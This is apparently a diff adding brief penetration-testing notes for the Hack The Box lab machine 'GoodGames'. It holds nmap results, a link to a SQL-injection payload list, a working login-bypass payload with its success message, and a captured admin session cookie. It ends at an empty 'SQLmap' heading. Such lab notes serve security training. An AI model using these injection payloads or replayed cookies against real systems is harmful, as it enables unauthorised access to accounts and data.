@@ -1,0 +1,25 @@
+10.10.11.130
+ttl 63
+
+[+]NMAP[+]
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.51
+|_http-title: GoodGames | Community and Store
+|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
+Service Info: Host: goodgames.htb
+
+
+[+]SQLI[+]
+
+http://goodgames.htb/login
+SQLI cheat shett >> https://github.com/payloadbox/sql-injection-payload-list
+
+BURPSUITE
+email=admin ' OR 1 -- -&password=password
+Login sucessfull
+
+[+]COOKIE SESSION ADMIN[+]
+Cookie: session=.eJw1yz0KgDAMBtC7fHMRXDN5E4kkjYX-QNNO4t3t4v7egzN29RsUObsGaOGUQWApqR7WmhgX9e0eFwKSgPaA3MxUUgWNPlearr0u9j-8Hz1GHgw.YofFJA.PIKVlJEqQw7qIvuzHpUrWILG-ms
+
+
+[+]SQLmap[+]
